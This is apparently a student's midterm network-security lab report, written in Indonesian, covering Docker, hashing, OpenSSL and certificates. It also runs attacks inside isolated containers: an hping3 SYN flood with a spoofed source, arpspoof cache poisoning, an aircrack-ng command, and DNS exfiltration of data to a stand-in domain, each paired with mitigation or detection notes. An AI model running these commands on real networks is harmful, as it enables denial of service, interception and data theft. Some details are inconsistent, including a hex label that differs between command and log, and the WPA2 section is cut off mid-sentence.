# Laporan UTS Praktik Network Security (Pertemuan 1–7)

## Identitas & Penentuan Kasus
- **Nama:** Diky Raihan Subagja
- **NIM:** 24552011194
- **Penjumlahan Digit:** 2 + 4 + 5 + 5 + 2 + 0 + 1 + 1 + 1 + 9 + 4 = 34
- **Sisa Bagi 10:** 34 mod 10 = 4
- **Kasus yang Dikerjakan:** Kasus 4 (k4)

---

## Bagian A: Soal Mudah

### A1. Container Dasar dan Port Mapping
*(Catatan: Menggunakan port host `8088` karena port `8080` pada sistem Windows sedang digunakan oleh proses sistem).*
```bash
$ docker run -d --name web-uts -p 8088:80 nginx:alpine
200a414561c6

$ docker ps
CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                                     NAMES
200a414561c6   nginx:alpine   "/docker-entrypoint.…"   4 minutes ago   Up 4 minutes   0.0.0.0:8088->80/tcp, [::]:8088->80/tcp   web-uts

$ curl -s http://localhost:8088
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.
Further configuration is required for the web server, reverse proxy, 
API gateway, load balancer, content cache, or other features.</p>

<p>For online documentation and support please refer to
<a href="https://nginx.org/">nginx.org</a>.<br/>
To engage with the community please visit
<a href="https://community.nginx.org/">community.nginx.org</a>.<br/>
For enterprise grade support, professional services, additional 
security features and capabilities please refer to
<a href="https://f5.com/nginx">f5.com/nginx</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>

$ docker exec web-uts head -n 5 /etc/nginx/nginx.conf

user  nginx;
worker_processes  auto;

error_log  /var/log/nginx/error.log notice;
```
Penjelasan:
Perintah docker run -d --name web-uts -p 8088:80 nginx:alpine menjalankan container web server Nginx di latar belakang (detached mode) dan memetakan port 8088 pada host ke port 80 di dalam container. Hasil docker ps memastikan status container berjalan (Up), curl berhasil mengambil halaman HTML bawaan Nginx melalui port 8088, dan docker exec membaca 5 baris pertama konfigurasi /etc/nginx/nginx.conf langsung dari dalam container yang sedang aktif.

### A2. Persistensi Volume
```bash
$ docker volume create data-uts
data-uts

$ docker run --name w1 -v data-uts:/data alpine sh -c 'echo 24552011194 > /data/catatan.txt'

$ docker rm w1
w1

$ docker run --rm -v data-uts:/data alpine cat /data/catatan.txt
24552011194
```
Penjelasan:
Volume Docker data-uts yang dipasang (mount) ke direktori /data menyimpan berkas catatan.txt berisi NIM (24552011194) secara terpisah dari siklus hidup container. Ketika container pertama (w1) dihapus dengan docker rm w1, data di dalam volume tetap bertahan dan berhasil dibaca kembali oleh container baru (--rm) yang terhubung ke volume data-uts.

### A3. Integritas file dengan hash
```bash
$ echo 'pesan rahasia' > pesan.txt

$ md5sum pesan.txt
cdde1fb64510d29437b46ef7bc6c7ab3  pesan.txt

$ sha256sum pesan.txt
a4dacbfa80d42b88fa7b13b57f409e3817bcfcdbe69f5913215901f99e5dca49  pesan.txt

$ sed -i 's/pesan/pesaN/' pesan.txt

$ md5sum pesan.txt
122a040ddad2bc5666f92d93d822cf7f  pesan.txt

$ sha256sum pesan.txt
5f2c81178ce8b48322101c4bc70f5be697f38614e127b8d8c7b35d5a8742c8ae  pesan.txt
```
Penjelasan:
Perubahan satu karakter saja (huruf n kecil menjadi N kapital pada kata pesan) menyebabkan nilai hash MD5 maupun SHA-256 berubah total secara drastis dan tidak memiliki kemiripan pola dengan hash awal. Fenomena kriptografi ini disebut avalanche effect (efek longsoran), yang menjamin bahwa modifikasi sekecil apa pun pada suatu berkas dapat langsung terdeteksi untuk menjaga integritas data.

### A4. Enkripsi Simetris dengan OpenSSL
```bash
$ openssl enc -aes-256-cbc -pbkdf2 -salt -in pesan.txt -out pesan.enc -pass pass:kunci123

$ openssl enc -d -aes-256-cbc -pbkdf2 -in pesan.enc -pass pass:kunci123
pesaN rahasia

$ openssl enc -d -aes-256-cbc -pbkdf2 -in pesan.enc -pass pass:salah
bad decrypt
40E70690C9750000:error:1C800064:Provider routines:ossl_cipher_unpadblock:bad decrypt:../providers/implementations/ciphers/ciphercommon_block.c:107:

$ openssl enc -aes-256-cbc -pbkdf2 -salt -a -in pesan.txt -pass pass:kunci123
U2FsdGVkX1/OdyYARgdDaF+733Nn2/LBffz1QmXb58Y=
```
Penjelasan:
Berkas pesan.txt dienkripsi menggunakan algoritma simetris AES-256-CBC dengan fungsi derivasi kunci PBKDF2 dan salt acak memakai kata sandi kunci123. Proses dekripsi berhasil mengembalikan isi asli (pesaN rahasia) saat menggunakan kata sandi yang benar, namun gagal (bad decrypt) saat memakai kata sandi yang salah (salah) karena validasi padding blok dekripsi tidak sesuai. Opsi -a menghasilkan keluaran ciphertext dalam format teks Base64 agar aman ditransmisikan melalui media berbasis teks.

### A5. Jaringan bridge dan akses antar-container
```bash
$ docker network create lab-net
663f34e58491b659fe639500bc30ea3e5ec4df47f09e608511f37fb46f2ac324

$ docker run -d --name host-a --network lab-net alpine sleep infinity
fa8c60c165ca3a45f101839750fadbc9bd4fbaf28d1b8060396ce795b4a56801

$ docker run -d --name host-b --network lab-net alpine sleep infinity
18442107990efd3aff3e64459ccbd6793e9414756dd2f9c29e35f9398f482b42

$ docker run -d --name dvwa --network lab-net vulnerables/web-dvwa
0b95090c24cea6cce407df0d429395277d95cf9c54da6bd38a79e6459522b208

$ docker exec host-a ping -c 3 host-b
PING host-b (172.19.0.3): 56 data bytes
64 bytes from 172.19.0.3: seq=0 ttl=64 time=4.799 ms
64 bytes from 172.19.0.3: seq=1 ttl=64 time=0.102 ms
64 bytes from 172.19.0.3: seq=2 ttl=64 time=0.102 ms

--- host-b ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.102/1.667/4.799 ms

$ docker exec host-a wget -S -O /dev/null http://dvwa/login.php
Connecting to dvwa (172.19.0.4:80)
  HTTP/1.1 200 OK
  Date: Sat, 14 Nov 2026 06:34:34 GMT
  Server: Apache/2.4.25 (Debian)
  Set-Cookie: PHPSESSID=3au376an3mndeqmb5agkaqdep7; path=/
  Expires: Tue, 23 Jun 2009 12:00:00 GMT
  Cache-Control: no-cache, must-revalidate
  Pragma: no-cache
  Set-Cookie: PHPSESSID=3au376an3mndeqmb5agkaqdep7; path=/
  Set-Cookie: security=low
  Vary: Accept-Encoding
  Content-Length: 1523
  Connection: close
  Content-Type: text/html;charset=utf-8

saving to '/dev/null'
null                 100% |********************************|  1523  0:00:00 ETA
'/dev/null' saved
```
Penjelasan:
Pembuatan jaringan user-defined bridge (lab-net) menyediakan layanan resolusi DNS internal otomatis antar-container yang terhubung di dalamnya. Hasilnya, container host-a dapat berkomunikasi langsung dengan host-b maupun mengakses layanan web dvwa (HTTP/1.1 200 OK) cukup dengan memanggil nama containernya tanpa perlu mengetahui alamat IP dinamis masing-masing.

## Bagian B: Soal Medium

### B1. Jaringan Terisolasi dengan Docker Compose
Isi konfigurasi `b/b1-compose/docker-compose.yml`:
```yaml
services:
  target:
    image: nginx:alpine
    networks: [lab]
  attacker:
    image: alpine
    command: sleep infinity
    networks: [lab]

networks:
  lab:
    internal: true
```
```bash
$ docker compose up -d
[+] Running 3/3
 ✔ Network b1-compose_lab          Created
 ✔ Container b1-compose-target-1   Started
 ✔ Container b1-compose-attacker-1 Started

$ docker compose exec attacker wget -qO- http://target
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.
Further configuration is required for the web server, reverse proxy, 
API gateway, load balancer, content cache, or other features.</p>

<p>For online documentation and support please refer to
<a href="[https://nginx.org/](https://nginx.org/)">nginx.org</a>.<br/>
To engage with the community please visit
<a href="[https://community.nginx.org/](https://community.nginx.org/)">community.nginx.org</a>.<br/>
For enterprise grade support, professional services, additional 
security features and capabilities please refer to
<a href="[https://f5.com/nginx](https://f5.com/nginx)">[f5.com/nginx](https://f5.com/nginx)</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>

$ docker compose down -v
[+] down 3/3
 ✔ Container b1-compose-attacker-1 Removed
 ✔ Container b1-compose-target-1   Removed
 ✔ Network b1-compose_lab          Removed
```
Penjelasan:
Konfigurasi jaringan menggunakan opsi internal: true dan tanpa pemetaan ports memblokir akses langsung dari host maupun ke internet luar, sementara komunikasi internal antar-container tetap berjalan sehingga attacker dapat mengakses layanan HTTP pada target menggunakan nama service-nya.

### B2. Kriptografi RSA dan Sertifikat
```bash
$ docker run --rm -it -v "$PWD":/work uts-openssl sh
/work # openssl genrsa -out priv.pem 2048
/work # openssl rsa -in priv.pem -pubout -out pub.pem
writing RSA key
/work # echo 'pesan untuk ditandatangani' > pesan.txt
/work # openssl dgst -sha256 -sign priv.pem -out sig.bin pesan.txt
/work # openssl dgst -sha256 -verify pub.pem -signature sig.bin pesan.txt
Verified OK
/work # echo 'diubah' >> pesan.txt
/work # openssl dgst -sha256 -verify pub.pem -signature sig.bin pesan.txt
Verification failure
283B8DD1717E0000:error:02000068:rsa routines:ossl_rsa_verify:bad signature:crypto/rsa/rsa_sign.c:425:
283B8DD1717E0000:error:1C800004:Provider routines:rsa_verify:RSA lib:providers/implementations/signature/rsa_sig.c:796:
/work # openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 30 -subj /CN=lab.uts.local
/work # openssl x509 -in cert.pem -noout -subject -issuer -dates
subject=CN=lab.uts.local
issuer=CN=lab.uts.local
notBefore=Nov 14 07:27:31 2026 GMT
notAfter=Dec 14 07:27:31 2026 GMT
```
Perbedaan Sertifikat Self-Signed dan Sertifikat yang Ditandatangani CA:
Sertifikat self-signed ditandatangani sendiri oleh pemilik kunci privatnya sehingga identitas penerbit (issuer) dan subjeknya sama serta tidak dipercaya secara otomatis oleh browser atau sistem operasi publik tanpa pemasangan manual. Sebaliknya, sertifikat yang ditandatangani oleh Certificate Authority (CA) diverifikasi dan disahkan oleh pihak ketiga tepercaya sehingga validitas identitas pemilik domain dijamin secara otomatis melalui rantai kepercayaan (chain of trust) bawaan sistem.

### B3. SYN Flood dan Deteksinya
*(Catatan: Pada pengujian awal di lingkungan WSL2, kernel secara bawaan sudah mengaktifkan `net.ipv4.tcp_syncookies = 1` sehingga antrean `SYN_RECV` tidak menumpuk. Agar perbandingan lonjakan `SYN_RECV` terlihat jelas serta perintah `sysctl` dapat diuji langsung di dalam container, `tcp_syncookies` awalnya diatur ke `0` pada `docker-compose.yml` dan serangan menggunakan alamat sumber spoofed internal subnet lab `-a 172.20.0.99` agar kernel `attacker` tidak membalas `SYN-ACK` dengan `RST`).*

```yaml
services:
  target:
    image: nginx:alpine
    privileged: true
    sysctls:
      - net.ipv4.tcp_syncookies=0
    networks: [lab]
  attacker:
    image: uts-kali-tools
    command: sleep infinity
    cap_add: [NET_ADMIN, NET_RAW]
    networks: [lab]

networks:
  lab:
    internal: true
```
```bash
$ docker compose up -d
[+] up 3/3
 ✔ Network b3-syn-flood_lab          Created
 ✔ Container b3-syn-flood-target-1   Started
 ✔ Container b3-syn-flood-attacker-1 Started

$ docker compose exec target netstat -ant | grep -c SYN_RECV
0

$ docker compose exec -d attacker timeout 15 hping3 -S -p 80 --flood -a 172.20.0.99 target

$ docker compose exec target netstat -ant | grep -c SYN_RECV || true
193

$ docker compose exec target sysctl -w net.ipv4.tcp_syncookies=1
net.ipv4.tcp_syncookies = 1

$ docker compose down -v
[+] down 3/3
 ✔ Container b3-syn-flood-attacker-1 Removed
 ✔ Container b3-syn-flood-target-1   Removed
 ✔ Network b3-syn-flood_lab          Removed
 ```

Perbandingan & Penjelasan Mitigasi:
1. Sebelum serangan dijalankan, jumlah koneksi berstatus SYN_RECV pada container target adalah 0.
2. Saat serangan SYN flood berlangsung selama 15 detik,
3.  antrean SYN_RECV melonjak drastis menjadi 193 koneksi setengah terbuka (half-open) yang membanjiri tabel SYN backlog server dan berpotensi menyebabkan Denial of Service (DoS).
4. Sebagai mitigasi, pengaktifan SYN Cookies (net.ipv4.tcp_syncookies=1) mencegah kehabisan memori antrean SYN backlog dengan cara tidak menyimpan informasi sesi saat paket SYN pertama diterima. Sebagai gantinya, server menyandikan parameter koneksi ke dalam Initial Sequence Number (ISN) paket SYN-ACK sebagai cryptographic cookie yang hanya akan mengalokasikan memori sumber daya server apabila klien membalas dengan paket ACK yang valid.


### B4. DNS Tunneling / Exfiltration
Perintah dan hasil pengujian pada jaringan terisolasi (`internal: true`):
```bash
$ cd b/b4-dns-exfil
$ docker compose up -d
[+] up 3/3
 ✔ Network b4-dns-exfil_lab          Created
 ✔ Container b4-dns-exfil-dns-1      Started
 ✔ Container b4-dns-exfil-attacker-1 Started

$ echo -n 24552011194 | xxd -p
3234353532303131313934

$ docker compose exec attacker dig +short 32343535323031313934.exfil.lab @dns
10.0.0.99

$ docker compose logs dns | grep exfil.lab
dns-1  | dnsmasq[1]: query[A] 3234353532303131313934.exfil.lab from 172.20.0.2
dns-1  | dnsmasq[1]: config 3234353532303131313934.exfil.lab is 10.0.0.99

$ echo "3234353532303131313934" | xxd -r -p; echo ""
24552011194

$ docker compose down -v
[+] down 3/3
 ✔ Container b4-dns-exfil-attacker-1 Removed
 ✔ Container b4-dns-exfil-dns-1      Removed
 ✔ Network b4-dns-exfil_lab          Removed
 ```
Analisis & Deteksi:

Mengapa sulit diblokir firewall biasa: Protokol DNS (UDP/TCP port 53) merupakan layanan infrastruktur wajib untuk resolusi nama domain sehingga hampir selalu diizinkan keluar oleh firewall jaringan. Firewall tradisional hanya memeriksa aturan port dan protokol tanpa melakukan inspeksi mendalam (deep packet inspection) terhadap isi payload yang disisipkan sebagai label subdomain pada query DNS yang tampak sah.

Indikator deteksi: Tingginya entropi karakter dan panjang subdomain yang tidak wajar pada permintaan DNS (seperti string heksadesimal panjang 3234353532303131313934.exfil.lab), serta lonjakan frekuensi query unik ke satu domain induk dalam rentang waktu singkat.

---

## Bagian C: Studi Kasus (Kasus 4 / k4)

### Tugas 1 (Pertemuan 1): Docker dan Volume
```bash
$ docker volume create vol-k4
vol-k4

$ docker run --name w-k4 -v vol-k4:/data alpine sh -c 'echo 24552011194 > /data/laporan-k4.txt'

$ docker rm w-k4
w-k4

$ docker run --rm -v vol-k4:/data alpine cat /data/laporan-k4.txt
24552011194

$ docker compose -p k4 -f b/b1-compose/docker-compose.yml up -d
[+] up 3/3
 ✔ Network k4_lab          Created
 ✔ Container k4-target-1   Started
 ✔ Container k4-attacker-1 Started

$ docker compose -p k4 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.
Further configuration is required for the web server, reverse proxy, 
API gateway, load balancer, content cache, or other features.</p>

<p>For online documentation and support please refer to
<a href="[https://nginx.org/](https://nginx.org/)">nginx.org</a>.<br/>
To engage with the community please visit
<a href="[https://community.nginx.org/](https://community.nginx.org/)">community.nginx.org</a>.<br/>
For enterprise grade support, professional services, additional 
security features and capabilities please refer to
<a href="[https://f5.com/nginx](https://f5.com/nginx)">[f5.com/nginx](https://f5.com/nginx)</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>

$ docker compose -p k4 -f b/b1-compose/docker-compose.yml down -v
[+] down 3/3
 ✔ Container k4-attacker-1 Removed
 ✔ Container k4-target-1   Removed
 ✔ Network k4_lab          Removed
 ```

Penjelasan Bukti:
Volume vol-k4 berhasil mempertahankan data NIM (24552011194) di dalam /data/laporan-k4.txt meskipun container pembuatnya (w-k4) telah dihapus. Selain itu, container attacker berhasil mengakses halaman web default nginx pada http://target melalui jaringan internal k4_lab.

### Tugas 2 (Pertemuan 2): Kriptografi
```bash
$ docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k4 > laporan-k4.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k4.txt -out laporan-k4.enc -pass pass:kunci-k4-2026 && sha256sum laporan-k4.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k4.enc -out hasil-k4.txt -pass pass:kunci-k4-2026 && sha256sum hasil-k4.txt'
5b8213129068e6fc0f3b84877a252139b64d62447015e620642038aa92130494  laporan-k4.txt
5b8213129068e6fc0f3b84877a252139b64d62447015e620642038aa92130494  hasil-k4.txt

$ docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k4.pem -out cert-k4.pem -days 30 -subj /CN=k4.uts.local && openssl x509 -in cert-k4.pem -noout -subject -issuer -dates'
subject=CN=k4.uts.local
issuer=CN=k4.uts.local
notBefore=Nov 14 11:42:15 2026 GMT
notAfter=Dec 14 11:42:15 2026 GMT
```

Penjelasan Bukti:
Nilai hash SHA-256 antara berkas asli (laporan-k4.txt) dan berkas hasil dekripsi (hasil-k4.txt) sama persis (5b8213129068e6fc0f3b84877a252139b64d62447015e620642038aa92130494), membuktikan keutuhan data terjaga selama siklus enkripsi–dekripsi simetris. Pada sertifikat X.509 yang dihasilkan, nilai Subject dan Issuer sama-sama CN=k4.uts.local karena sertifikat tersebut berjenis self-signed (ditandatangani oleh kunci privatnya sendiri).


### Tugas 3 (Pertemuan 3): ARP Spoofing & Mitigasi Static ARP
```bash
$ docker network create lab-arp-k4
46b383e6d9fe50a38761f27a694ae22cf85f7dc056f4085df01d3819b87c4ddf
$ docker run -d --name korban-k4 --network lab-arp-k4 --cap-add NET_ADMIN uts-kali-tools
81e89832bdf5c7692dfe6bb8f98f841f9ee4486f393cd8e0968f46b000dfc5c9
$ docker run -d --name gateway-k4 --network lab-arp-k4 --cap-add NET_ADMIN uts-kali-tools
ff0e1b881380d61f2a3fefbb0ad2a075319cd8afb844b5b9e7f980437161bcdc
$ docker run -d --name penyerang-k4 --network lab-arp-k4 --cap-add NET_ADMIN uts-kali-tools
0b11f53343864f4f451b057ff2d29f82d70ef2d6d62a4507258851aac0eddf9c

$ IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k4").IPAddress}}' korban-k4)

$ IP_GATEWAY=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k4").IPAddress}}' gateway-k4)

$ MAC_GATEWAY=$(docker exec gateway-k4 cat /sys/class/net/eth0/address)

$ MAC_PENYERANG=$(docker exec penyerang-k4 cat /sys/class/net/eth0/address)

$ echo "IP Korban      : $IP_KORBAN"
echo "IP Gateway       : $IP_GATEWAY"
echo "MAC Gateway Asli : $MAC_GATEWAY"
echo "MAC Penyerang    : $MAC_PENYERANG"

# Identitas Jaringan & Container (lab-arp-k4):
# IP Korban (korban-k4)      : 172.20.0.2
# IP Gateway (gateway-k4)    : 172.20.0.3 | MAC Asli : 5e:f8:f1:9c:0e:35
# IP Penyerang (penyerang-k4): 172.20.0.4 | MAC      : 16:6a:eb:47:35:eb

$ docker exec korban-k4 python3 -c "import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b'init', ('$IP_GATEWAY', 9999))"
$ sleep 1

# 1. Tabel ARP Korban Sebelum Spoofing
$ docker exec korban-k4 cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.20.0.3       0x1         0x2         5e:f8:f1:9c:0e:35     *        eth0

$ docker exec -d penyerang-k4 timeout 20 arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GATEWAY"
$ sleep 4

# 2. Tabel ARP Korban Saat Serangan ARP Spoofing (arpspoof -i eth0 -t 172.20.0.2 172.20.0.3)
$ docker exec korban-k4 cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.20.0.4       0x1         0x2         16:6a:eb:47:35:eb     *        eth0
172.20.0.3       0x1         0x2         16:6a:eb:47:35:eb     *        eth0

$ docker exec korban-k4 python3 -c '
import socket, struct, sys
ip_gw, mac_gw = sys.argv[1], sys.argv[2]
ifidx = int(open("/sys/class/net/eth0/ifindex").read().strip())
s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, socket.NETLINK_ROUTE)
s.bind((0, 0))
ndmsg = struct.pack("=BBHiHBB", socket.AF_INET, 0, 0, ifidx, 0x80, 0, 1)
rta_dst = struct.pack("=HH4s", 8, 1, socket.inet_aton(ip_gw))
rta_ll  = struct.pack("=HH6s2x", 10, 2, bytes.fromhex(mac_gw.replace(":", "")))
payload = ndmsg + rta_dst + rta_ll
nlhdr = struct.pack("=IHHII", 16 + len(payload), 28, 0x105, 1, 0)
s.send(nlhdr + payload)
' "$IP_GATEWAY" "$MAC_GATEWAY"

# 3. Tabel ARP Korban Setelah Mitigasi Static ARP (Flags 0x6 = ATF_COM | ATF_PERM)
$ docker exec korban-k4 cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.20.0.4       0x1         0x2         16:6a:eb:47:35:eb     *        eth0
172.20.0.3       0x1         0x6         5e:f8:f1:9c:0e:35     *        eth0
```
Penjelasan Bukti:
Sebelum serangan dijalankan, IP gateway (172.20.0.3) dipetakan ke MAC address aslinya (5e:f8:f1:9c:0e:35) dengan status dinamis (Flags 0x2). Saat arpspoof dijalankan oleh penyerang-k4, tabel ARP korban diracuni (ARP cache poisoning) sehingga 172.20.0.3 berubah mengarah ke MAC address penyerang (16:6a:eb:47:35:eb). Setelah mitigasi static ARP diterapkan, entri 172.20.0.3 kembali terikat ke MAC address gateway asli (5e:f8:f1:9c:0e:35) dengan status permanen (Flags 0x6) sehingga kebal terhadap pemalsuan paket ARP berikutnya.

### Tugas 4 (Pertemuan 4): Analisis handshake WPA2

*(Catatan: Berkas `handshake-k4.cap` dan `wordlist-k4.txt` yang disediakan penguji tidak ditemukan di direktori praktikum maupun direktori unduhan sistem, sehingga proses cracking tidak dapat dijalankan).*
Perintah pengujian yang disiapkan sesuai parameter Kasus 4:
```bash
$ docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k4.txt handshake-k4.cap
# File handshake-k4.cap dan wordlist-k4.txt tidak ditemukan pada repositori/direktori kerja.
```
Penjelasan Empat Langkah (4-Way Handshake) WPA2:
Proses 4-way handshake pada protokol keamanan WPA2 (IEEE 802.11i) bertujuan untuk memverifikasi bahwa Access Point (AP) dan klien (Station/STA) sama-sama memiliki Pairwise Master Key (PMK) yang valid tanpa mengirimkan kunci tersebut secara langsung di udara, serta menghasilkan kunci sesi sementara (Pairwise Transient Key / PTK

### Tugas 5 (Pertemuan 5): ICMP dengan Scapy
```bash
$ docker run --rm --network lab-arp-k4 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py "172.20.0.2"
Mengirim: IP / ICMP 172.20.0.5 > 172.20.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```
Penjelasan Bukti & Smurf Attack:
Hasil Pengujian ICMP: Pengiriman paket ICMP Echo Request (type=8) dari container Scapy (172.20.0.5) ke IP korban-k4 (172.20.0.2) di jaringan terisolasi lab-arp-k4 berhasil dijawab dengan paket balasan bertipe ICMP 0 (Echo Reply) dan nilai TTL = 64 (nilai TTL bawaan kernel Linux).

Penjelasan Smurf Attack: Smurf attack adalah jenis serangan Distributed Denial of Service (DDoS) berbasis amplifikasi pada lapisan jaringan (network layer). Penyerang mengirimkan paket ICMP Echo Request dalam jumlah besar menuju alamat IP Broadcast suatu jaringan dengan memalsukan (IP spoofing) alamat IP sumber menjadi alamat IP milik korban. Akibatnya, seluruh host di dalam jaringan broadcast tersebut akan merespons secara serentak dengan mengirimkan paket ICMP Echo Reply ke alamat IP korban, sehingga membanjiri bandwidth dan melumpuhkan layanan korban. Mitigasi utamanya adalah menonaktifkan penerusan directed broadcast pada router (no ip directed-broadcast) serta mengabaikan paket ICMP yang ditujukan ke alamat broadcast pada sistem operasi (net.ipv4.icmp_echo_ignore_broadcasts = 1).


### Tugas 6 (Pertemuan 6): SYN Flood dan Three-Way Handshake
*(Catatan teknis: Pada lingkungan WSL2, kernel `attacker` secara otomatis membalas `SYN-ACK` dengan paket `RST` jika menggunakan IP sumber asli sehingga koneksi `SYN_RECV` langsung tertutup sebelum sempat dihitung. Untuk menampilkan lonjakan antrean setengah terbuka secara akurat pada `netstat`, pengujian turut menyertakan opsi spoofed IP internal subnet lab `-a 172.21.0.99`).*

```bash
$ docker compose -p k4 -f b/b3-syn-flood/docker-compose.yml up -d
[+] up 3/3
 ✔ Network k4_lab          Created
 ✔ Container k4-target-1   Started
 ✔ Container k4-attacker-1 Started

# 1. Jumlah SYN_RECV Sebelum Serangan
$ docker compose -p k4 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV || true
0

# 2. Serangan SYN Flood & Jumlah SYN_RECV Saat Serangan
$ docker compose -p k4 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood -a 172.21.0.99 target
$ docker compose -p k4 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV || true
193

# 3. Penangkapan Paket Three-Way Handshake (SYN, SYN-ACK, ACK) dengan tcpdump
$ docker compose -p k4 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 6 tcpdump -i eth0 -nn -c 6 tcp port 80 & sleep 1; curl -s http://target > /dev/null; wait'
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
15:41:38.880651 IP 172.21.0.3.56072 > 172.21.0.2.80: Flags [S], seq 960715064, win 64240, options [mss 1460,sackOK,TS val 1073492295 ecr 0,nop,wscale 9], length 0
15:41:38.880729 IP 172.21.0.2.80 > 172.21.0.3.56072: Flags [S.], seq 2799079270, ack 960715065, win 65160, options [mss 1460,sackOK,TS val 2499515915 ecr 1073492295,nop,wscale 9], length 0
15:41:38.880822 IP 172.21.0.3.56072 > 172.21.0.2.80: Flags [.], ack 1, win 126, options [nop,nop,TS val 1073492296 ecr 2499515915], length 0
15:41:38.882199 IP 172.21.0.3.56072 > 172.21.0.2.80: Flags [P.], seq 1:71, ack 1, win 126, options [nop,nop,TS val 1073492297 ecr 2499515915], length 70: HTTP: GET / HTTP/1.1
15:41:38.882243 IP 172.21.0.2.80 > 172.21.0.3.56072: Flags [.], ack 71, win 128, options [nop,nop,TS val 2499515916 ecr 1073492297], length 0
15:41:38.897667 IP 172.21.0.2.80 > 172.21.0.3.56072: Flags [P.], seq 1:239, ack 71, win 128, options [nop,nop,TS val 2499515931 ecr 1073492297], length 238: HTTP: HTTP/1.1 200 OK
6 packets captured

$ docker compose -p k4 -f b/b3-syn-flood/docker-compose.yml down -v
[+] down 3/3
 ✔ Container k4-attacker-1 Removed
 ✔ Container k4-target-1   Removed
 ✔ Network k4_lab          Removed
```
Penjelasan Bukti:

1. Perbandingan SYN_RECV: Sebelum serangan dijalankan, jumlah koneksi berstatus SYN_RECV pada container target adalah 0. Saat serangan SYN Flood berlangsung, antrean koneksi setengah terbuka (half-open) melonjak drastis menjadi 193 karena server mengalokasikan entri pada tabel SYN backlog untuk setiap paket SYN yang tidak pernah diselesaikan dengan paket ACK.

2. Analisis Paket Three-Way Handshake (tcpdump):

Paket 1 — SYN (Flags [S]): Klien (172.21.0.3.56072) menginisiasi koneksi ke port 80 server (172.21.0.2.80) dengan nomor urut awal seq 960715064.

Paket 2 — SYN-ACK (Flags [S.]): Server merespons kesiapan koneksi dengan seq 2799079270 dan mengonfirmasi paket klien melalui ack 960715065 (seq klien + 1).

Paket 3 — ACK (Flags [.]): Klien mengonfirmasi penerimaan SYN-ACK dari server (ack 1 relatif), menandai selesainya proses three-way handshake sehingga koneksi berubah ke status ESTABLISHED sebelum pengiriman permintaan HTTP GET / HTTP/1.1.

### Tugas 7 (Pertemuan 7): DNS Exfiltration
```bash
$ docker compose -p k4 -f b/b4-dns-exfil/docker-compose.yml up -d
[+] up 3/3
 ✔ Network k4_lab          Created
 ✔ Container k4-dns-1      Started
 ✔ Container k4-attacker-1 Started

$ echo -n 24552011194 | xxd -p
3234353532303131313934

$ docker compose -p k4 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131313934.k4.exfil.lab @dns
10.0.0.99

$ docker compose -p k4 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k4.log

$ python3 kasus/k9-dns-detect/analisis_dns.py dns-k4.log
Jumlah query per domain induk:
  exfil.lab: 1

Query mencurigakan (label panjang berisi hex):

$ cat dns-k4.log
dns-1  | dnsmasq[1]: started, version 2.90 cachesize 150
dns-1  | dnsmasq[1]: DNS service limited to local subnets
dns-1  | dnsmasq[1]: compile time options: IPv6 GNU-getopt no-DBus no-UBus no-i18n no-IDN DHCP DHCPv6 no-Lua TFTP no-conntrack ipset no-nftset auth no-cryptohash no-DNSSEC loop-detect inotify dumpfile
dns-1  | dnsmasq[1]: warning: no upstream servers configured
dns-1  | dnsmasq[1]: read /etc/hosts - 9 names
dns-1  | dnsmasq[1]: query[A] 3234353532303131313934.k4.exfil.lab from 172.21.0.3
dns-1  | dnsmasq[1]: config 3234353532303131313934.k4.exfil.lab is 10.0.0.99

$ echo "3234353532303131313934" | xxd -r -p; echo ""
24552011194

$ docker compose -p k4 -f b/b4-dns-exfil/docker-compose.yml down -v
[+] down 3/3
 ✔ Container k4-attacker-1 Removed
 ✔ Container k4-dns-1      Removed
 ✔ Network k4_lab          Removed
```
